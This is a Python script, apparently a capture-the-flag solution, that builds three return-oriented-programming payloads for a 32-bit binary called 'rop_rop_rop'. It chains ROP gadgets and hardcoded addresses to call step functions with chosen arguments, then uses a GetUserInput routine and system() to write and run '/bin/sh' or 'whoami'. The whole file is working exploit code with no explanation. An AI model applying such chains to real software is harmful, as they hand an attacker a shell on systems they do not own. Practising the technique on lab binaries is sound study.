import struct


# ROPgadget --binary rop_rop_rop
# 0x0804841a : add esp, 8 ; pop ebx ; ret
PPP_RET = 0x0804841a
# 0x0804841d : pop ebx ; ret
P_RET = 0x0804841d


def pack(list):
    result = b''
    for x in list:
        if isinstance(x, bytes):
            result += x
        elif isinstance(x, str):
            result += x.encode()
        elif isinstance(x, int):
            result += struct.pack('<L', x)
    return result


payload1 = pack([
    b'\x00BCD'
    b'EFGH'
    b'IJKL'
    b'MNOP',
    0x0804871E,  # step1_addr
    PPP_RET,     # ppp_ret
    0x00000000,  # a1
    0x41414141,  # a2
    0xA2B3C4D5,  # a3

    0x08048766,  # step2_addr
    PPP_RET,     # ppp_ret
    0xFF25A7D4,  # a1
    0x41414141,  # a2
    0x00000000,  # no used argument, not found pp_ret fitted for PPP_RET

    0x080487A3,  # step2_addr
    PPP_RET,     # ppp_ret
    0xFFFFFFFF,  # a1
    0x0C0C0C0C,  # a2
    0x9A829A82,  # a3

    0x0000000a,  # terminal code

    'whoami\n',  # command
])


WRITEABLE = 0x0804A04C


payload2 = pack([
    b'\x00BCD'
    b'EFGH'
    b'IJKL'
    b'MNOP',

    0x080485F2,     # GetUserInput(char *dest)
    P_RET,          # pop ret
    WRITEABLE,      # writeable

    0x08048480,     # system_addr
    P_RET,
    WRITEABLE,

    '\n',           # terminal code

    '/bin/sh\n',     # command
])


payload3 = pack([
    b'\x00BCD'
    b'EFGH'
    b'IJKL'
    b'MNOP',

    0x080485F2,     # GetUserInput(char *dest)
    0x08048480,     # system_addr
    WRITEABLE,      # writeable
    WRITEABLE,

    '\n',           # terminal code

    '/bin/sh\n',    # command
])

if __name__ == '__main__':
    print(payload1)
    print(payload2)
    print(payload3)
